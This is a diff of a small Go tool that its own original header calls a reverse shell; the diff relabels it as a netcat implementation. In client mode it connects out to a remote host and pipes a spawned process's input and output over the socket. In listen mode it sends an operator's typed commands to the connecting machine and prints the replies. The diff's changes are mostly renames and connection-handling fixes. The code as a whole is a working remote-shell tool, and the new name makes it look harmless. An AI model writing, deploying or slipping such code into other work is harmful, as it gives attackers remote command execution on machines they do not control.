@@ -1,4 +1,4 @@
-// Go-reverse-shell
+// Go-netcat-implementation
 
 package main
 
@@ -11,65 +11,61 @@ import (
 	"os"
 	"os/exec"
 	"strconv"
+	"time"
 )
 
 func main() {
 	// Setting up flags
 	listen := flag.Bool("l", false, "Listen mode")
-	PORT := flag.Int("p", 0, "-p [PORT]")
+	RPORT := flag.Int("p", 8000, "-p [PORT]")
 	flag.Parse()
-	RHOST := flag.Arg(0)
+	RRHOST := flag.Arg(0)
+
+	// Usage
 	if len(flag.Args()) < 1 && !(*listen) {
-		fmt.Println("Usage: gors -l -p [PORT]")
-		fmt.Println("       gors -p [PORT] [HOST]")
-    return 
+		fmt.Println("Usage: gors -l -p [RPORT]")
+		fmt.Println("       gors [RHOST] -p [RPORT]")
+		return
 	}
 
 	// Functionality
 	if *listen {
 		reader := bufio.NewReader(os.Stdin)
 		// Setting up listener
-		listener, err := net.Listen("tcp", ":"+strconv.Itoa(*PORT))
+		listener, err := net.Listen("tcp", ":"+strconv.Itoa(*RPORT))
 		if err != nil {
 			fmt.Println(err)
 			return
 		}
-		fmt.Printf("Listening on port %d...\n", *PORT)
+		fmt.Printf("Listening on port %d...\n", *RPORT)
 		defer listener.Close()
 		// Handle connections
-		for {
-			conn, err := listener.Accept()
-			if err != nil {
-				fmt.Println(err)
-				continue
-			}
-			handleConn_AsServer(conn, reader)
+		conn, err := listener.Accept()
+		if err != nil {
+			fmt.Println(err)
+			return
 		}
+		handleConn_AsServer(conn, reader)
 	} else {
 		// Setting up connection
-		address := RHOST + ":" + strconv.Itoa(*PORT)
+		address := RRHOST + ":" + strconv.Itoa(*RPORT)
 		conn, err := net.Dial("tcp", address)
 		if err != nil {
 			fmt.Println("Error connecting to the host")
 			return
 		}
 		// Handle connection
-		fmt.Printf("Connected to %s:%d\n", RHOST, *PORT)
+		fmt.Printf("Connected to %s:%d\n", RRHOST, *RPORT)
 		handleConn(conn)
 	}
 	// Error handling
 	defer func() {
 		if r := recover(); r != nil {
-			fmt.Println("Usage: gors -l -p [PORT]")
-			fmt.Println("       gors -p [PORT] [HOST]")
+			fmt.Println("Usage: gors -l -p [RPORT]")
+			fmt.Println("       gors -p [RPORT] [RHOST]")
 		}
 	}()
 } // main
-
-
-
-
-
 
 /* Connection Handler (client) */
 func handleConn(conn net.Conn) {
@@ -84,7 +80,7 @@ func handleConn(conn net.Conn) {
 
 	cmd.Stdin = conn
 	cmd.Stdout = wp
-  cmd.Stderr = wp
+	cmd.Stderr = wp
 
 	go io.Copy(conn, rp)
 
@@ -94,23 +90,35 @@ func handleConn(conn net.Conn) {
 	}
 }
 
-
-
-
-
-
 func handleConn_AsServer(conn net.Conn, reader *bufio.Reader) {
 	/* Connection Handler (server) */
+	defer conn.Close()
+	fmt.Printf("Connected to %s\n", conn.RemoteAddr().String())
+	buf := make([]byte, 1024)
 	for {
-		buf := make([]byte, 2048)
 		// Read
-		conn.Read(buf)
-		fmt.Printf(string(buf))
+		for {
+			conn.SetReadDeadline(time.Now().Add(time.Second))
+			n, err := conn.Read(buf)
+			if err != nil {
+				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+					break
+				}
+				fmt.Println(err)
+			}
+			fmt.Printf(string(buf[:n]))
+		}
 
 		// Write
 		cmd, err := reader.ReadString('\n')
 		if err != nil {
 			fmt.Println(err)
+		}
+		if cmd == "" {
+			continue
+		} else if cmd == "exit\n" {
+			conn.Close()
+			break
 		}
 		if _, err := conn.Write([]byte(cmd)); err != nil {
 			fmt.Println("Error sending datagram: ", err)
